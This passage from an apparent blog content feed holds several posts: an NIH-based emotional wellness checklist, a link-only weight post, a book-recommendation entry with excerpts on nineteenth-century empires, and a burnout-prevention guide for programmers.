<h4 id="加强社会联系"><a href="#加强社会联系" class="headerlink" title="加强社会联系"></a><strong>加强社会联系</strong></h4><p>社会关系可能有助于保护健康和延长寿命。科学家们发现，我们与他人的联系可以对我们的身心健康产生强大的影响。无论是与浪漫的伴侣、家人、朋友、邻居或其他人，社会关系都会影响我们的生物和幸福。</p>
<h4 id="构建健康的社会支持系统："><a href="#构建健康的社会支持系统：" class="headerlink" title="构建健康的社会支持系统："></a>构建健康的社会支持系统：</h4><ul>
<li>与你的孩子建立牢固的关系。</li>
<li>积极行动建立与家人和朋友分享的良好习惯。</li>
<li>如果你是家庭照顾者，学会向别人寻求帮助。</li>
<li>加入一个专注于自己喜爱的爱好的团体，如阅读、远足或绘画。</li>
<li>加入一个课程，学点新东西。</li>
<li>在社区里做一些你关心的事情，比如社区花园、学校、图书馆或礼拜场所。</li>
<li>到不同的地方去结识新朋友。</li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/illustration-social-connections-collage-2.jpg" alt=""></p>
<h2 id="Emotional-Wellness-Checklist"><a href="#Emotional-Wellness-Checklist" class="headerlink" title="Emotional Wellness Checklist"></a>Emotional Wellness Checklist</h2><h4 id="BRIGHTEN-YOUR-OUTLOOK"><a href="#BRIGHTEN-YOUR-OUTLOOK" class="headerlink" title="BRIGHTEN YOUR OUTLOOK"></a><strong>BRIGHTEN YOUR OUTLOOK</strong></h4><p>People who are emotionally well, experts say, have fewer negative emotions and are able to bounce back from difficulties faster. This quality is called resilience. Another sign of emotional wellness is being able to hold onto positive emotions longer and appreciate the good times.</p>
<h4 id="To-develop-a-more-positive-mindset"><a href="#To-develop-a-more-positive-mindset" class="headerlink" title="To develop a more positive mindset:"></a>To develop a more positive mindset:</h4><ul>
<li>Remember your good deeds.</li>
<li>Forgive yourself.</li>
<li>Spend more time with your friends.</li>
<li>Explore your beliefs about the meaning and purpose of life.</li>
<li>Develop healthy physical habits.</li>
</ul>
<h4 id="REDUCE-STRESS"><a href="#REDUCE-STRESS" class="headerlink" title="REDUCE STRESS"></a><strong>REDUCE STRESS</strong></h4><p>Everyone feels stressed from time to time. Stress can give you a rush of energy when it’s needed most. But if stress lasts a long time—a condition known as chronic stress—those “high alert” changes become harmful rather than helpful. Learning healthy ways to cope with stress can also boost your resilience.</p>
<h4 id="To-help-manage-your-stress"><a href="#To-help-manage-your-stress" class="headerlink" title="To help manage your stress"></a>To help manage your stress</h4><ul>
<li>Get enough sleep.</li>
<li>Exercise regularly.</li>
<li>Build a social support network.</li>
<li>Set priorities.</li>
<li>Think positive.</li>
<li>Try relaxation methods.</li>
<li>Seek help.</li>
</ul>
<h4 id="GET-QUALITY-SLEEP"><a href="#GET-QUALITY-SLEEP" class="headerlink" title="GET QUALITY SLEEP"></a><strong>GET QUALITY SLEEP</strong></h4><p>To fit in everything we want to do in our day, we often sacrifice sleep. But sleep affects both mental and physical health. It’s vital to your well-being. When you’re tired, you can’t function at your best. Sleep helps you think more clearly, have quicker reflexes and focus better. Take steps to make sure you regularly get a good night’s sleep.</p>
<h4 id="To-get-better-quality-sleep"><a href="#To-get-better-quality-sleep" class="headerlink" title="To get better quality sleep:"></a>To get better quality sleep:</h4><ul>
<li>Go to bed and get up each day at the same time.</li>
<li>Sleep in a dark, quiet place.</li>
<li>Exercise daily.</li>
<li>Limit the use of electronics.</li>
<li>Relax before bedtime.</li>
<li>Avoid alcohol, nicotine, &amp; stimulants late in the day.</li>
<li>Consult a health care professional if you have ongoing sleep problems.</li>
</ul>
<h4 id="BE-MINDFUL"><a href="#BE-MINDFUL" class="headerlink" title="BE MINDFUL"></a><strong>BE MINDFUL</strong></h4><p>The concept of mindfulness is simple. This ancient practice is about being completely aware of what’s happening in the present—of all that’s going on inside and all that’s happening around you. It means not living your life on “autopilot.” Becoming a more mindful person requires commitment and practice. Here are some tips to help you get started.</p>
<h4 id="To-be-more-mindful"><a href="#To-be-more-mindful" class="headerlink" title="To be more mindful:"></a>To be more mindful:</h4><ul>
<li>Take some deep breaths in through your nose to a count of 4, hold for 1 second and then exhale through the mouth to a count of 5. Repeat often.</li>
<li>Enjoy a stroll and notice the sights around you.</li>
<li>Practice mindful eating. Be aware of each bite and when you’re full.</li>
<li>Find mindfulness resources in your local community, including classes, programs, or books.</li>
</ul>
<h4 id="COPE-WITH-LOSS"><a href="#COPE-WITH-LOSS" class="headerlink" title="COPE WITH LOSS"></a><strong>COPE WITH LOSS</strong></h4><p>When someone you love dies, your world changes. There is no right or wrong way to mourn. Although the death of a loved one can feel overwhelming, most people can make it through the grieving process with the support of family and friends. Learn healthy ways to help you through difficult times.</p>
<h4 id="To-help-cope-with-loss"><a href="#To-help-cope-with-loss" class="headerlink" title="To help cope with loss:"></a>To help cope with loss:</h4><ul>
<li>Take care of yourself.</li>
<li>Talk to a caring friend.</li>
<li>Try not to make any major changes right away.</li>
<li>Join a grief support group.</li>
<li>Consider professional support.</li>
<li>Talk to your doctor if you’re having trouble with everyday activities.</li>
<li>Be patient. Mourning takes time.</li>
</ul>
<h4 id="STRENGTHEN-SOCIAL-CONNECTIONS"><a href="#STRENGTHEN-SOCIAL-CONNECTIONS" class="headerlink" title="STRENGTHEN SOCIAL CONNECTIONS"></a><strong>STRENGTHEN SOCIAL CONNECTIONS</strong></h4><p>Social connections might help protect health and lengthen life. Scientists are finding that our links to others can have powerful effects on our health—both emotionally and physically. Whether with romantic partners, family, friends, neighbors, or others, social connections can influence our biology and well-being.</p>
<h4 id="To-build-healthy-support-systems"><a href="#To-build-healthy-support-systems" class="headerlink" title="To build healthy support systems:"></a>To build healthy support systems:</h4><ul>
<li>Build strong relationships with your kids.</li>
<li>Get active and share good habits with family and friends.</li>
<li>If you’re a family caregiver, ask for help from others.</li>
<li>Join a group focused on a favorite hobby, such as reading, hiking, or painting.</li>
<li>Take a class to learn something new.</li>
<li>Volunteer for things you care about in your community, like a community garden, school, library, or place of worship.</li>
<li>Travel to different places and meet new people.</li>
</ul>
<h2 id="扩展阅读：《嗑药简史》"><a href="#扩展阅读：《嗑药简史》" class="headerlink" title="扩展阅读：《嗑药简史》"></a>扩展阅读：《嗑药简史》</h2><h4 id="嗑药简史（一）：药物成瘾与神经系统"><a href="#嗑药简史（一）：药物成瘾与神经系统" class="headerlink" title="嗑药简史（一）：药物成瘾与神经系统"></a><a href="https://riboseyim.github.io/2017/09/04/Addiction-Decision/">嗑药简史（一）：药物成瘾与神经系统</a></h4><ul>
<li>什么是瘾？成瘾分类：物质成瘾、行为成瘾</li>
<li>药物成瘾：管制药品及毒品、宗教致幻剂、酒精和烟草</li>
<li>行为成瘾：饮食、运动、性、暴力和战争</li>
<li>瘾的形成机制：奖赏路径和神经递质（多巴胺、肾上腺素、内啡肽和催产素）</li>
</ul>
<h4 id="嗑药简史（二）：瘾品跨境流动与外交关系"><a href="#嗑药简史（二）：瘾品跨境流动与外交关系" class="headerlink" title="嗑药简史（二）：瘾品跨境流动与外交关系"></a><a href="https://riboseyim.github.io/2017/11/06/Addiction-Decision-Fentanyl/">嗑药简史（二）：瘾品跨境流动与外交关系</a></h4><p>扰动中美大国外交的 China Girl (芬太尼)</p>
<ul>
<li>什么是芬太尼,Fentanyl</li>
<li>大国外交的头等优先事项</li>
<li>预测：暗黑幽灵无国界</li>
</ul>
<h4 id="嗑药简史（三）：瘾品管制背后的情与法"><a href="#嗑药简史（三）：瘾品管制背后的情与法" class="headerlink" title="嗑药简史（三）：瘾品管制背后的情与法"></a><a href="https://riboseyim.github.io/2018/01/07/Addiction-Decision-Law/">嗑药简史（三）：瘾品管制背后的情与法</a></h4><ul>
<li>严刑峻法：瘾品管制与定罪量刑</li>
<li>戈尔巴乔夫的禁酒运动</li>
</ul>
<h4 id="嗑药简史（四）：咖啡上瘾，喝还是不喝？"><a href="#嗑药简史（四）：咖啡上瘾，喝还是不喝？" class="headerlink" title="嗑药简史（四）：咖啡上瘾，喝还是不喝？"></a><a href="https://riboseyim.github.io/2018/05/14/Addiction-Decision-Coffee/">嗑药简史（四）：咖啡上瘾，喝还是不喝？</a></h4><ul>
<li>咖啡的保健作用及临床实证研究案例</li>
<li>咖啡种类、制作工艺对健康效益的影响</li>
</ul>
<h4 id="嗑药简史（附录）：NIDA-美国青年人群药物滥用情况-2016-2017"><a href="#嗑药简史（附录）：NIDA-美国青年人群药物滥用情况-2016-2017" class="headerlink" title="嗑药简史（附录）：NIDA | 美国青年人群药物滥用情况(2016~2017)"></a><a href="https://riboseyim.github.io/2017/12/20/Addiction-Decision-2016-USA-Students/">嗑药简史（附录）：NIDA | 美国青年人群药物滥用情况(2016~2017)</a></h4><h4 id="医学常识-NIH-情绪健康检查单"><a href="#医学常识-NIH-情绪健康检查单" class="headerlink" title="医学常识| NIH 情绪健康检查单"></a><a href="https://riboseyim.github.io/2018/01/22/Health-Emotional/">医学常识| NIH 情绪健康检查单</a></h4><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://www.nih.gov/health-information/emotional-wellness-toolkit">Emotional Wellness Toolkit</a></li>
</ul>
]]></content>
      <categories>
        <category>自然科学</category>
      </categories>
      <tags>
        <tag>Science</tag>
        <tag>Health</tag>
      </tags>
  </entry>
  <entry>
    <title>Health-Weight</title>
    <url>/2020/09/06/Health-Weight/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><a id="more"></a>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://mp.weixin.qq.com/s/BM8_5jek6Az6eFLF0Xrlkw" target="_blank" rel="noopener">老年人如何减肥？科学家发现这种减肥方法或许值得一试</a></li>
<li><a href="https://www.health.harvard.edu/blog/weight-loss-for-life-the-dietfits-study-2018040913595?utm_source=delivra&amp;utm_medium=email&amp;utm_campaign=BF20180416-WeighLess&amp;utm_id=883026&amp;dlv-ga-memberid=53992465&amp;mid=53992465&amp;ml=883026" target="_blank" rel="noopener">Which diet is best for long-term weight loss?</a></li>
<li><a href="http://songshuhui.net/archives/98060" target="_blank" rel="noopener">科学松鼠会：吃糖还是代糖？</a></li>
<li><a href="http://songshuhui.net/archives/95854" target="_blank" rel="noopener">是什么吃胖了我们（3） 蛋白质 | 水白羊</a></li>
<li><a href="http://songshuhui.net/archives/95587" target="_blank" rel="noopener">是什么吃胖了我们（2） 脂肪 | 水白羊</a></li>
<li><a href="http://songshuhui.net/archives/95567" target="_blank" rel="noopener">是什么吃胖了我们（1） 碳水化合物 | 水白羊</a></li>
<li><a href="http://songshuhui.net/archives/95504" target="_blank" rel="noopener">节选《让我们害怕的食物——美国食品恐慌小史》 | 山寨盲流</a></li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>帝国主义史 | History of Empire</title>
    <url>/2018/12/31/History-Empire/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>荐书|《帝国的铸就》</li>
<li>荐书|《西洋国情》<a id="more"></a>
</li>
</ul>
<blockquote>
<p>通常来说，一个国家或者民族被称为“特色”的东西，是指一种缺点或特质……当今日本教育工作者喋喋不休的所谓日本人与众不同的大部分特质，将会使我们的学问更加贫困……  —— 西园寺公望</p>
</blockquote>
<h2 id="荐书"><a href="#荐书" class="headerlink" title="荐书"></a>荐书</h2><h4 id="《西洋国情》"><a href="#《西洋国情》" class="headerlink" title="《西洋国情》"></a>《西洋国情》</h4><p>出500美元就想雇佣价值3000美元的教师去教书，岂不是荒谬之极？试问用这个价钱雇用人，他果真会心甘情愿地接受这项工作吗？从古至今，这种“合算”的买卖还闻所未闻。如果一味地以削减教育的费用为目的，即使受教育者数量增加了，但是教育的质量却下降了。这就好比不管什么商品，一旦质量下降，需求也会减少。不仅商品的品味，而且最终商品的数量也会逐渐减少。世上任何物品只要需求者减少，生产者也会减少，这个物品自然而然就减少。— p226</p>
<h4 id="《帝国的铸就》"><a href="#《帝国的铸就》" class="headerlink" title="《帝国的铸就》"></a>《帝国的铸就》</h4><blockquote>
<p>分析现代自由政权起起落落的书成百上干，它们也描述了独裁政权的出现。从来没有一本书特别重视1861年至1871年间的几场改革，这个十年构成了人类自由编年史上最引人瞩目的篇章，也见证了恐怖和高压统治的新哲学的出现。</p>
</blockquote>
<h4 id="节选｜第一章-绝境边缘的三个民族"><a href="#节选｜第一章-绝境边缘的三个民族" class="headerlink" title="节选｜第一章 绝境边缘的三个民族"></a>节选｜第一章 绝境边缘的三个民族</h4><p>在日渐衰落的18世纪，俄国不再是一个奴隶制国家。但是，它也没有成为一个自由国度。国内矛盾重重。日渐衰落的专制体制，对于人民的蠢蠢欲动尚能勉强压制，然而对于他们的希望，却已然难以遏制。人民心怀不满，不再卑躬屈膝、畏缩怯懦。显而易见，危机的爆发已经为期不远。</p>
<p>登上皇位的亚历山大决意先发制人，阻止这场灾难。不过，他该何去何从呢?摆在面前的有两条路。一条路，是将高压统治继续下去:而另一条，则是追求自由的觉醒。</p>
<p>有一段时间，自由体制似乎已经蓄势待发，即将大获全胜。然面，出现了相反的反应。在全世界，特权阶级起来维护自身的特权地位。在俄园、德意志，甚至就在美国，走投无路的贵族用维护自身权力的专制思想来对抗自由的挑战。新的专制哲学基于两点。</p>
<p>首先，是家长式的统治。这个理念是对抗自由国度的强力武器，……根据政府最新的家长理论，国家要像父亲爱孩子一样爱人民。所以伟大的自由史学者麦考利爵土写道：新的家长式政体会“管理学校，监视运动场。将劳作和娱乐的时间固定下来。规定什么歌能唱，什么曲子能弹，什么书能读，什么药能吃…..”</p>
<p>贵族的第二个立足点是激进的民族主义。</p>
<p>歌剧院中的巴黎人却呵欠连天。他们裹着厚厚的丝绸和皮草，沉溺于社会发展和帝国传承所累积的财富，他们看不到，用不了多久，他们的平静就会被瓦格纳歌剧中预言的“狂飙突进运动”打破。19世纪60年代尚未过去，他们的城市就将被德意志的军队占领，他们的殿堂、房屋和医院都将被德意志人的炮弹粉碎。唐怀瑟精神的苏醒喻示着德意志民族的觉醒，这个民族重新认识到了自己的力量。然而对此，巴黎人却视而不见。</p>
<p>在巴黎人的迟钝似乎也情有可原，因为在1861年初，德意志的改革还不易为人们觉察。德意志内部有着数不清的公国，所以德意志的力量究竟到达何种程度鲜为人知。自古罗马的塔西佗时代以来，观察者们就常常为德意志民族特殊的禀赋而震惊，这个民族有种热衷暴力行动的精神。但在1861年3月，这种禀赋被浪费在了两个敌对党派的龙争虎斗，以及三十个小公国的纷争之中。</p>
<h4 id="节选｜第四章-自由宣言"><a href="#节选｜第四章-自由宣言" class="headerlink" title="节选｜第四章 自由宣言"></a>节选｜第四章 自由宣言</h4><p>新的强权哲学之所以危险，正是因为它直指自由国家理想的要害。它攻击人人生而平等的原则。正如林肯所说:</p>
<p>自由社会的定义和公理被否认，被回避，而且他们取得了不小的胜利。有人时髦地称之为“漂亮的空话”，有人不客气地称之为” 一派胡言”，还有人阴险地说它们只适用于“高级人种”。这些表述尽管形式不同，但在实质上和影响上是相同的一取代自由政府的原则， 恢复等级制度、家族和正统性的原则。他们乐于见到贵族老爷们聚集，密谋与人民为敌。他们是复辟专制的先锋，是开路者。我们必须打倒他们，否则他们就会征服我们。</p>
<p>俄罗斯帝国皇帝、芬兰大公、波兰国王尼古拉二世及其皇后、女大公和皇储一家人。1918年7月17日，沙皇全家包括仆人在内被全俄肃清反革命及怠工非常委员会下令秘密处决，长者50岁，幼者13岁。</p>
<p>如果“复辟专制的先锋”在美利坚合众国得势，或者北美大陆上出现两个敌对的共和政体，一个奴隶制，一个自由制，那么美国能否足够强大，足够自由，在未来的几十年中，当奴隶制帝国在德意志和俄国出现，并在20世纪迫切要求主宰全世界的时候，美国能否有效地与之抗衡，就值得商榷了。</p>
<p>火车载着总统的遗体，飞驰着穿过乡村，春天的花朵正在盛开，在远远的交叉路口，在孤独的小村庄里，在荒芜的农场边缘，美国民众站在铁轨边，向被害的总统致敬。许多人用手帕抹着眼泪。妇人们的怀里抱着婴儿。小学生们手里握着镶黑边的美国国旗。在煤气灯照亮的火车站站台上，成群的少女围在起唱赞美诗; 她们穿着圣洁的白色衣袍， 胸前垂下黑色的肩带。有些哀悼者拿着手写的标语牌:“向值得致敬者致敬”、“英雄烈士”、“华盛顿，国父:林肯，国之救主”、“人虽死，言犹在”。</p>
<h2 id="Resources"><a href="#Resources" class="headerlink" title="Resources"></a>Resources</h2><ul>
<li><a href="https://mp.weixin.qq.com/s?__biz=MjM5MTY1MjQ3Nw==&amp;mid=2651940532&amp;idx=1&amp;sn=1fb7629123377f20308fcf462f63fb34&amp;chksm=bd5789a68a2000b0cdd3134e12886261b682048c4f5f3719672d7ead06edff925a1ff7f4d12e&amp;token=1403618953&amp;lang=zh_CN#rd" target="_blank" rel="noopener">微信公众号@睿哥杂货铺：荐书|帝国的铸就</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2>]]></content>
      <categories>
        <category>政治历史</category>
      </categories>
      <tags>
        <tag>Economist</tag>
        <tag>History</tag>
      </tags>
  </entry>
  <entry>
    <title>IT 工程师养生指南</title>
    <url>/2017/04/21/Health/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>《养生指南》</li>
<li>《嗑药简史》</li>
</ul>
<span id="more"></span>
<p>This article is part of an <strong>Work Life Balance</strong> tutorial series. Make sure to check out my other articles as well:</p>
<ul>
<li><a href="https://riboseyim.github.io/2017/04/21/Health/">IT 工程师养生指南</a></li>
<li><a href="https://riboseyim.github.io/2018/01/22/Health-Emotional/">医学常识| NIH 情绪健康检查单</a></li>
</ul>
<h4 id="为什么会产生倦怠？"><a href="#为什么会产生倦怠？" class="headerlink" title="为什么会产生倦怠？"></a>为什么会产生倦怠？</h4><blockquote>
<p>“burnout is caused when you repeatedly make large amounts of sacrifice and or effort into high-risk problems that fail. ”</p>
</blockquote>
<p>相比其他领域的专业人士，程序员似乎更经常出现倦怠（Burnout ）。目前没有明确的证据能够描述这种情况, 大致有以下四个主要原因：</p>
<p>第一，物理的（physical）。程序员每天坐在办公桌前的工作方式是不健康的, 它会让你感到更加昏昏欲睡。嗜睡也可能导致其他不那么好的习惯, 如白天吃零食, 沉迷兴奋剂, 熬夜等，导致身体损伤。<br>第二，编程工作是认知高度集中和紧张的工作, 心理疲劳也可能会造成精神损伤。<br>第三，也可能是因为你正在做的工作, 事实上,耗费心力而且吃力不讨好。解决这一问题的唯一办法就是在不考虑金钱为因素的情况下, 花点时间对你想从事的工作做一些反省。<br>第四，当你作出大量牺牲,或努力解决高风险的问题, 但是反复失败时就会造成倦怠。在编程过程中往往伴随着运行失败，你的大脑容易将工作和失败联系在一起。</p>
<p>在工作中如何维持积极性，保持长久的生产力？下面介绍一些可行的技巧, 加以练习养成习惯后能够有效地延缓甚至消除倦怠。</p>
<h4 id="基本套餐"><a href="#基本套餐" class="headerlink" title="基本套餐"></a>基本套餐</h4><blockquote>
<p>It’s a simple but effective strategy for staying productive as a programmer while at the same getting some necessary break between the tasks.</p>
</blockquote>
<ul>
<li><strong>吃好。</strong> 从小的方面开始, 比如喝苏打水;将低碳水化合物和蔬菜纳入饮食；少量多餐, 不要暴饮暴食。</li>
<li><strong>睡好。</strong> 包括获得足够良好的睡眠。你有许多事情可以做, 例如创造一个更好的睡眠环境。一个秘诀是减少蓝光照射 — 可能会让你晚上熬夜。推荐软件：<a href="https://justgetflux.com">Flux</a> 能随着一天的时间变化自动调整你电脑显示器屏幕的色温，过滤对人眼伤害最大的蓝光，从而尽可能减少屏幕对眼睛所带来的疲劳感并帮助提高睡眠质量。相应地，<strong>白天要多晒太阳</strong>。诱发睡眠的最重要的因素之一是你的身体自然分泌一种叫做褪黑素（Melatonin）的荷尔蒙。褪黑素是由你大脑中的松果体（pineal gland，位于脊椎动物脑中的小内分泌腺体，人体最小的器官）产生的, 它发出信号来调节身体中的睡眠-唤醒周期。阳光提供了天然的光谱, 我们需要配合褪黑素的生产周期。白天多点光线, 晚上少点光线, 一个神奇的睡眠公式。</li>
<li><strong>不要过度劳累。</strong> 许多研究成果一再发现, 在这种情况下, 生产率(此处特指产出)在 4 个小时的专注工作之后就开始急剧下降。需要高度集中注意力的工作, 例如如长期的编程, 每天持续工作很长时间是不可能的。</li>
<li><strong>番茄工作法</strong>（Pomodoro Technique，一种时间管理法方法，该方法使用一个定时器来分割出一个一般为25分钟的工作时间和5分钟的休息时间，而那些时间段被称为 pomodori，为意大利语单词 pomodoro “番茄” 的复数）。理想情况下, 休息时远离计算机，进行轻快的散步,做一些俯卧撑等。</li>
<li><strong>Stay active, keep moving.</strong> 很多人对运动（exercise）有一种误解,认为锻炼必须包括去健身房等等。在现实中有很多保持活跃的方法，例如选择楼梯而不是电梯; 把车停在购物中心的街角停车点; 骑车去工作, 找到其他的方法将运动融入到你的日常生活中会让你感觉更好, 而不是整天卡在电脑前。</li>
</ul>
<h4 id="程序员增强套餐"><a href="#程序员增强套餐" class="headerlink" title="程序员增强套餐"></a>程序员增强套餐</h4><blockquote>
<p>戚继光：有精器而无精兵以用之，是谓徒费；有精兵而无精器以助之，是谓徒强。</p>
</blockquote>
<ul>
<li><strong>尝试, 游戏, 学习, 实验原型（Experiment, play, learn, prototype）。</strong> 短期来看，只做你最擅长的事是高效和有利可图的。例如, 继续以重复的方式创建网站,。然而, 随着时间的推移, 它会变得无聊以及耗费精神。从工程的角度看，编程是使用行之有效的技术来生产软件的一个环节。同时它也关于乐趣, 实验和尝试新的想法。你可以特意将 20% 的时间用来游手好闲 — 这是避免倦怠的最有效的策略之一。游手好闲包括尝试新的类库, 创建一些有趣而不纯粹为了完成工作任务的东西, 或者从你的舒适区走出来、投资时间学习的东西, 例如函数式编程。</li>
<li><strong>参加聚会、会议、订阅行业资讯。</strong> 编程会变得孤独。与其他开发者见面, 或者倾听他们在播客上的经验, 使你不仅仅只关注眼前的状况, 而是更关心你的工作。没有人喜欢抱怨, 但分享或倾听，与其他程序员交流, 例如倾听别人是如何克服困难的有助于舒缓情绪, 激励信心。</li>
<li><strong>创造一个良好的工作环境并且不要吝啬投资你的工具(Invest in a good working environment and don’t be cheap on your tools ) 。</strong> 一台高配置的 PC 将编译得更快而不是让你将时间浪费在等待。请确保您有一个舒适的椅子, 桌子和良好设置的显示器。如果你在一个嘈杂的环境中工作, 可以投资高质量的耳机隔绝噪音使你保持安静。</li>
<li><strong>Master your tools.</strong> 虽然有好的工具可以使编程过程更愉快, 熟练地掌握它们提高工作效率更加令人欣慰。了解工具的所有快捷方式, 即编辑器、OS、命令行, 每天都可以节省大量时间。如果能够将日常任务自动化，则可以让你更快地取得进步, 更进一步消除工作倦怠。</li>
<li><strong>休息，保持对其它事物的激情。</strong> 除了编程之外, 还有许多有趣的活动。例如: 体育、文化活动、性、阅读、乐高、社交、钓鱼、烘焙咖啡、摄影等。如果你一直只做一件事, 比如编程, 总有一天你会不可避免地醒来 — 因为没有生命而憎恨自己。此外, 做一些看似与你的 “实际” 工作无关的事情, 可能会重新点燃你的激情, 激发新的想法, 就像理查德·费曼（著名物理学家，诺贝尔奖得主）在研究板块活动时一样。</li>
<li><strong>考虑切换工作内容或启动不同的项目。</strong> 如果你当前被困在做无趣的、耗费精神工作上, 比如整天调整现有的代码库。或者你所从事的项目可能与你的兴趣或价值观不符。此外, 如果你发现编码不再能引起你的兴趣, 不妨看看其它相关的领域, 如信息系统架构（Information Architecture）, 系统管理（Systems Administration）等,可能会重新激发你的激情。</li>
<li><strong>完成例行任务</strong>, 将那些你知道可以完成的内容纳入每日工作。诸如完成代码测试、写注释、改进变量命名等, 完成这些活动将释放内啡肽（神经递质，产生类似于吗啡一样的止痛效果和欣快感）。这是一个简短但非常有价值的提示, 这一过程使我们的大脑对我们的工作感到更加积极，非常有助于恢复工作能力。</li>
</ul>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><ul>
<li><a href="https://riboseyim.github.io/2017/09/15/Visualization-OmniGraffle/">数据可视化（一）思维利器 OmniGraffle 绘图指南 </a></li>
<li><a href="https://riboseyim.github.io/2017/09/15/Visualization-Graphviz/">数据可视化（三）基于 Graphviz 实现程序化绘图</a></li>
<li><a href="https://riboseyim.github.io/2017/05/12/Visualization-Charts/">数据可视化（五）基于网络爬虫制作可视化图表</a></li>
<li><a href="http://www.jianshu.com/p/7c453ce42150">最佳写作实践：从Evernote到Ulysses</a></li>
<li><a href="https://riboseyim.github.io/2017/06/03/Writing-WriterToolChain/">我的写作工具链</a></li>
<li><a href="https://riboseyim.github.io/2017/08/06/TeamWork-Kanban/">Kanban 看板管理实践精要</a></li>
</ul>
<h2 id="扩展阅读：嗑药简史"><a href="#扩展阅读：嗑药简史" class="headerlink" title="扩展阅读：嗑药简史"></a>扩展阅读：嗑药简史</h2><h4 id="嗑药简史（一）：药物成瘾与神经系统"><a href="#嗑药简史（一）：药物成瘾与神经系统" class="headerlink" title="嗑药简史（一）：药物成瘾与神经系统"></a><a href="https://riboseyim.github.io/2017/09/04/Addiction-Decision/">嗑药简史（一）：药物成瘾与神经系统</a></h4><ul>
<li>什么是瘾？成瘾分类：物质成瘾、行为成瘾</li>
<li>药物成瘾：管制药品及毒品、宗教致幻剂、酒精和烟草</li>
<li>行为成瘾：饮食、运动、性、暴力和战争</li>
<li>瘾的形成机制：奖赏路径和神经递质（多巴胺、肾上腺素、内啡肽和催产素）</li>
</ul>
<h4 id="嗑药简史（二）：瘾品跨境流动与外交关系"><a href="#嗑药简史（二）：瘾品跨境流动与外交关系" class="headerlink" title="嗑药简史（二）：瘾品跨境流动与外交关系"></a><a href="https://riboseyim.github.io/2017/11/06/Addiction-Decision-Fentanyl/">嗑药简史（二）：瘾品跨境流动与外交关系</a></h4><p>扰动中美大国外交的 China Girl (芬太尼)</p>
<ul>
<li>什么是芬太尼,Fentanyl</li>
<li>大国外交的头等优先事项</li>
<li>预测：暗黑幽灵无国界</li>
</ul>
<h4 id="嗑药简史（三）：瘾品管制背后的情与法"><a href="#嗑药简史（三）：瘾品管制背后的情与法" class="headerlink" title="嗑药简史（三）：瘾品管制背后的情与法"></a><a href="https://riboseyim.github.io/2018/01/07/Addiction-Decision-Law/">嗑药简史（三）：瘾品管制背后的情与法</a></h4><ul>
<li>严刑峻法：瘾品管制与定罪量刑</li>
<li>戈尔巴乔夫的禁酒运动</li>
</ul>
<h4 id="嗑药简史（四）：咖啡上瘾，喝还是不喝？"><a href="#嗑药简史（四）：咖啡上瘾，喝还是不喝？" class="headerlink" title="嗑药简史（四）：咖啡上瘾，喝还是不喝？"></a><a href="https://riboseyim.github.io/2018/05/14/Addiction-Decision-Coffee/">嗑药简史（四）：咖啡上瘾，喝还是不喝？</a></h4><ul>
<li>咖啡的保健作用及临床实证研究案例</li>
<li>咖啡种类、制作工艺对健康效益的影响</li>
</ul>
<h4 id="嗑药简史（附录）：NIDA-美国青年人群药物滥用情况-2016-2017"><a href="#嗑药简史（附录）：NIDA-美国青年人群药物滥用情况-2016-2017" class="headerlink" title="嗑药简史（附录）：NIDA | 美国青年人群药物滥用情况(2016~2017)"></a><a href="https://riboseyim.github.io/2017/12/20/Addiction-Decision-2016-USA-Students/">嗑药简史（附录）：NIDA | 美国青年人群药物滥用情况(2016~2017)</a></h4><h2 id="资源：美国农业部·食品成分数据库"><a href="#资源：美国农业部·食品成分数据库" class="headerlink" title="资源：美国农业部·食品成分数据库"></a>资源：美国农业部·食品成分数据库</h2><p>United States Department of Agriculture<br>Agricultural Research Service<br>USDA Food Composition Databases</p>
<ul>
<li><a href="https://ndb.nal.usda.gov/ndb/search/list?fgcd=&amp;manu=&amp;lfacet=&amp;count=&amp;max=&amp;sort=&amp;qlookup=&amp;offset=&amp;format=Abridged&amp;new=&amp;measureby=&amp;ds=&amp;order=&amp;qt=&amp;qp=&amp;qa=&amp;qn=&amp;q=&amp;ing=">美国农业部·食品成分数据库 | USDA Food Composition Databases</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://medium.com/@karolisram/preventing-burnout-for-programmers-12b4968adbaa">Preventing burnout for programmers</a></li>
<li><a href="https://theshawnstevensonmodel.com/sleep-problems-tips/">Here’s 21 Tips To Get The Best Sleep Ever</a></li>
<li><a href="https://www.health.harvard.edu/blog/weight-loss-for-life-the-dietfits-study-2018040913595?utm_source=delivra&amp;utm_medium=email&amp;utm_campaign=BF20180416-WeighLess&amp;utm_id=883026&amp;dlv-ga-memberid=53992465&amp;mid=53992465&amp;ml=883026">Which diet is best for long-term weight loss?</a></li>
<li><a href="http://songshuhui.net/archives/98060">科学松鼠会：吃糖还是代糖？</a></li>
<li><a href="http://songshuhui.net/archives/95854">是什么吃胖了我们（3） 蛋白质 | 水白羊</a></li>
<li><a href="http://songshuhui.net/archives/95587">是什么吃胖了我们（2） 脂肪 | 水白羊</a></li>
<li><a href="http://songshuhui.net/archives/95567">是什么吃胖了我们（1） 碳水化合物 | 水白羊</a></li>
<li><a href="http://songshuhui.net/archives/95504">节选《让我们害怕的食物——美国食品恐慌小史》 | 山寨盲流</a></li>
<li><a href="http://time.com/4275710/fasting-diet-5-2-weight-loss/?xid=time_socialflow_twitter&amp;utm_campaign=time&amp;utm_source=twitter.com&amp;utm_medium=social">TIME:You Asked: Should I Try a Fasting Diet?</a></li>
<li><a href="http://songshuhui.net/archives/99817">果壳网|为什么今年的流感特别危险</a></li>
</ul>
]]></content>
      <categories>
        <category>自然科学</category>
      </categories>
      <tags>
        <tag>Medical</tag>
        <tag>Science</tag>
        <tag>Health</tag>
      </tags>
  </entry>
  <entry>
